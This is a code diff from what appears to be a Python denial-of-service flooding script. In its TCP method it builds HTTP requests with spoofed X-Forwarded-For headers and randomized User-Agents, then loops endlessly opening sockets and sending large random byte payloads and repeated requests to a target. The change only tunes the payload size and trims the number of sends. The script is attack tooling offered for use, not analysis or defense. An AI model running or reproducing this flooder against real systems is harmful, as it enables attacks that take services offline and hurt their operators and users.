@@ -173,7 +173,7 @@ if method == "TCP":
         httpss = "User-Agent: " + random.choice(https) + "\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         request = get_host + post_host + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(150404)
+        grtools = random._urandom(50411)
         while True:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -184,18 +184,6 @@ if method == "TCP":
                     sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
                     s.sendall(str.encode(request))
                     s.sendall(str.encode(request))
                 sock.close()
